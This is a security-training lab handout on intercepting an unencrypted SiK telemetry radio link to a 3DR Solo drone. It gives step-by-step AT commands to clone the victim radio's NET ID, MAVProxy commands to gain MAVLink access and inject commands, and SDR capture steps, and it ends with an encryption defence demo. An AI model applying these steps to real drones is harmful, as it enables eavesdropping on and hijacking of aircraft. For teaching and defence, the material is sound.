# Lab: SiK Radio Hacks

**Type:** Lab
**Duration:** 45 minutes
**Section:** Day 2 – RF Communications

---

## Objectives

- Configure a SiK radio pair and observe the MAVLink link
- Use a second SiK radio with matching NET ID to intercept the link
- Demonstrate passive eavesdropping on unencrypted telemetry
- Inject a MAVLink command via the intercepted link

---

## Hardware Required

- 1× SiK radio pair 
- 1× additional SiK radio (attack radio)
- 3DR Solo (powered, no props)
- USB cables for all radios
- Kali laptop

---

## Phase 1: Observe the Legitimate SiK Link

```bash
# Connect the legitimate GCS SiK radio to your laptop
# Check which port it appeared as
dmesg | tail -10
# Look for: ttyUSB0 or ttyACM0

# Open MAVProxy through the GCS radio
mavproxy.py --master=/dev/ttyUSB0 --baud=57600

# Once connected, you will see telemetry from the Solo:
# APM: ArduCopter V3.5.x ...
# HEARTBEAT
# ATTITUDE messages

# Read radio parameters (enter +++, then ATI5)
# Exit MAVProxy first: Ctrl-C
```

---

## Phase 2: Read GCS Radio Parameters

```bash
# Connect directly to the radio for AT commands
minicom -D /dev/ttyUSB0 -b 57600

# Enter AT command mode
# Type exactly: +++ (no Enter)
# Wait ~1 second for "OK" response

# Read all parameters
ATI5

# Record:
# NET ID: (probably 25)
# AIR SPEED: (probably 64)
# ENCRYPT LEVEL: (probably 0 = none)
# NUM CHANNELS: (probably 50)
```

---

## Phase 3: Configure Attack Radio to Match

```bash
# Disconnect the GCS radio
# Connect the attack radio to your laptop

dmesg | tail -5   # Note new port, e.g. /dev/ttyUSB1

minicom -D /dev/ttyUSB1 -b 57600

# Enter AT command mode
+++
# Response: OK

# Read current parameters
ATI5

# Set NET ID to match victim (replace 25 with what you found)
ATS3=25

# Set air speed to match
ATS2=64

# Write to EEPROM
AT&W

# Reboot
ATZ
```

---

## Phase 4: Intercept with Attack Radio

```bash
# Keep the legitimate air radio connected to the Solo UAV
# The legitimate GCS radio should be DISCONNECTED (unplugged from laptop)

# Now connect the attack radio to your laptop
mavproxy.py --master=/dev/ttyUSB1 --baud=57600

# Within a few seconds, you should see:
# Heartbeat from system X (autopilot)
# ATTITUDE messages flowing in

# You now have full MAVLink access to the drone
```

**Observe:**
```bash
MAV> status
MAV> param show ARMING*
MAV> param show FS_*
```

---

## Phase 5: Read Parameters and Demonstrate Injection

```bash
# Read all parameters via the attack radio
MAV> param show *

# Demonstrate command injection (safe - drone disarmed, no props):
# Request autopilot capabilities
MAV> module load message
MAV> message REQUEST_AUTOPILOT_CAPABILITIES 1

# Or send a simple status request
MAV> link status
```

>**Warning:** In a real assessment, do not send mode-change or arm/disarm commands to a live drone.

---

## Phase 6: Passive RF Capture with HackRF

Observe the SiK radio signal without any SiK hardware:

```bash
# Open GQRX
gqrx

# Configure:
# Device: HackRF
# Frequency: 915.000 MHz
# Sample rate: 2.0 MSPS
# Mode: Narrow FM
# Filter: 10 kHz

# Watch the waterfall — you should see brief bursts every ~100ms (telemetry packets)
```

```bash
# Capture an IQ recording
# In GQRX: click the record button (red circle)
# Record for 30 seconds
# Save as: sik-telemetry.raw

# Analyze in URH
urh sik-telemetry.raw
# URH will attempt to auto-detect modulation and bit rate
# Configure: FSK, 64k baud, Manchester encoding
```

---

## Phase 7: Enable Encryption (Defense Demo)

```bash
# On the GCS radio
minicom -D /dev/ttyUSB0 -b 57600
+++
ATS15=1
ATS16=0123456789ABCDEF0123456789ABCDEF   # 32 hex chars = 128-bit key
AT&W
ATZ

# On the air radio (via SSH to Solo):
ssh root@10.1.1.10
# Find where the Solo's SiK radio is configured
cat /etc/solo.conf | grep -i radio

# Alternatively, configure via Mission Planner → Initial Setup → SiK Radio
```

After enabling encryption on both radios with matching keys:
- Try the attack radio again — it will NOT receive intelligible data
- The attack radio has the wrong key

---

## Discussion Questions

1. How many 3DR Solo drones in the field use NET ID 25? What is the implication?
2. With a $30 RTL-SDR, what is the practical range at which you could eavesdrop?
3. If MAVLink v2 signing was enabled, would the attack radio injection still work?
4. What is the defense-in-depth approach if RF encryption is not available?
